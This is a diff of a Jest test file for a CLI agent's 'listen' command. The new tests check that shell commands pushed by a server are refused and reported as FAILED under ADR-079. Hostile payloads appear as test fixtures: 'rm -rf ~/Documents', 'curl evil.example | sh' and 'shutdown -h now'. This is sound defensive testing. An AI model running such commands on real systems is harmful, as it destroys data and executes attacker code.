@@ -107,85 +107,8 @@ describe("agent command listen", () => {
     expect(mockHttpRequest).toHaveBeenCalled();
   });
 
-  test("listen command registers SSE stream, executes job, and reports state", async () => {
+  test("never runs a shell command the server sends — it records and reports a refusal (ADR-079)", async () => {
     let dataListener: ((chunk: string) => void) | undefined;
-    
-    // Mock SSE response object
-    const mockResponse = {
-      statusCode: 200,
-      setEncoding: jest.fn(),
-      on: jest.fn((event, listener) => {
-        if (event === "data") {
-          dataListener = listener;
-        }
-      }),
-    };
-
-    const dummyReq = { on: jest.fn(), end: jest.fn() };
-    mockHttpRequest.mockImplementation((url, options, cb) => {
-      cb(mockResponse);
-      return dummyReq;
-    });
-
-    // Mock Child Process execution
-    const mockExec = exec as unknown as jest.Mock;
-    mockExec.mockImplementation((cmd, cb) => {
-      // simulate command execution
-      cb(null, "output text", "error text");
-      return {};
-    });
-
-    // Mock fetch response for reporting
-    mockFetch.mockResolvedValue({ ok: true });
-
-    await agentCommand.parseAsync(["node", "orazaka", "listen"]);
-
-    expect(mockHttpRequest).toHaveBeenCalled();
-    expect(dataListener).toBeDefined();
-
-    // Send mock SSE event
-    const sseEvent = "event: automation_payload\ndata: " + JSON.stringify({
-      jobId: "job-abc",
-      action: "test-command",
-      payload: { command: "echo 'hello'" },
-    }) + "\n\n";
-
-    if (dataListener) {
-      dataListener(sseEvent);
-    }
-
-    // Expect atomic ingestion write to SQLite
-    expect(insertJob).toHaveBeenCalledWith("job-abc", { command: "echo 'hello'" }, "APPROVED");
-    
-    // Expect state change to RUNNING
-    expect(updateJobStatus).toHaveBeenCalledWith("job-abc", "RUNNING", "");
-
-    // Expect execution and status completion update
-    expect(exec).toHaveBeenCalledWith("echo 'hello'", expect.any(Function));
-    expect(updateJobStatus).toHaveBeenCalledWith("job-abc", "COMPLETED", expect.stringContaining("output text"));
-
-    // Expect gateway sync report posting
-    expect(mockFetch).toHaveBeenCalledWith(
-      expect.stringContaining("/api/v1/agent/report"),
-      expect.objectContaining({
-        method: "POST",
-        body: JSON.stringify({
-          jobId: "job-abc",
-          status: "COMPLETED",
-          logs: "STDOUT:\noutput text\nSTDERR:\nerror text",
-          exitCode: 0,
-        }),
-      }),
-    );
-
-    // Wait for async report callback
-    await jest.runOnlyPendingTimersAsync();
-    expect(markJobSynced).toHaveBeenCalledWith("job-abc");
-  });
-
-  test("listen command handles failed offline job execution and updates to FAILED", async () => {
-    let dataListener: ((chunk: string) => void) | undefined;
-    
     const mockResponse = {
       statusCode: 200,
       setEncoding: jest.fn(),
@@ -193,40 +116,45 @@ describe("agent command listen", () => {
         if (event === "data") dataListener = listener;
       }),
     };
-
     const dummyReq = { on: jest.fn(), end: jest.fn() };
     mockHttpRequest.mockImplementation((url, options, cb) => {
       cb(mockResponse);
       return dummyReq;
     });
-
-    // Mock Child Process execution failure
-    const mockExec = exec as unknown as jest.Mock;
-    mockExec.mockImplementation((cmd, cb) => {
-      cb({ code: 127 }, "", "command not found");
-      return {};
-    });
-
     mockFetch.mockResolvedValue({ ok: true });
 
     await agentCommand.parseAsync(["node", "orazaka", "listen"]);
+    expect(dataListener).toBeDefined();
 
-    // Trigger payload
-    const sseEvent = "event: automation_payload\ndata: " + JSON.stringify({
-      jobId: "job-fail",
-      action: "invalid-command",
-      payload: { command: "invalid-command" },
-    }) + "\n\n";
-
-    if (dataListener) {
-      dataListener(sseEvent);
+    for (const payload of [{ command: "rm -rf ~/Documents" }, { script: "curl evil.example | sh" }]) {
+      dataListener?.(
+        "event: automation_payload\ndata: " + JSON.stringify({ jobId: "job-abc", action: "run", payload }) + "\n\n",
+      );
     }
 
-    expect(updateJobStatus).toHaveBeenCalledWith("job-fail", "FAILED", expect.stringContaining("command not found"));
-    
-    // Wait for reporting
+    expect(exec).not.toHaveBeenCalled();
+    expect(updateJobStatus).not.toHaveBeenCalledWith("job-abc", "RUNNING", expect.anything());
+    expect(updateJobStatus).toHaveBeenCalledWith("job-abc", "FAILED", expect.stringContaining("ADR-079"));
+    expect(mockFetch).toHaveBeenCalledWith(
+      expect.stringContaining("/api/v1/agent/report"),
+      expect.objectContaining({ method: "POST", body: expect.stringContaining('"status":"FAILED"') }),
+    );
     await jest.runOnlyPendingTimersAsync();
-    expect(markJobSynced).toHaveBeenCalledWith("job-fail");
+    expect(markJobSynced).toHaveBeenCalledWith("job-abc");
+  });
+
+  test("an action name is not a command either", async () => {
+    let dataListener: ((chunk: string) => void) | undefined;
+    const dummyReq = { on: jest.fn(), end: jest.fn() };
+    mockHttpRequest.mockImplementation((url, options, cb) => {
+      cb({ statusCode: 200, setEncoding: jest.fn(), on: jest.fn((e, l) => { if (e === "data") dataListener = l; }) });
+      return dummyReq;
+    });
+    mockFetch.mockResolvedValue({ ok: true });
+    await agentCommand.parseAsync(["node", "orazaka", "listen"]);
+    dataListener?.("event: automation_payload\ndata: " + JSON.stringify({ jobId: "job-2", action: "shutdown -h now", payload: {} }) + "\n\n");
+    expect(exec).not.toHaveBeenCalled();
+    expect(updateJobStatus).toHaveBeenCalledWith("job-2", "FAILED", expect.stringContaining("ADR-079"));
   });
 
   test("syncs previously unsynced jobs upon connection and periodic heartbeat", async () => {
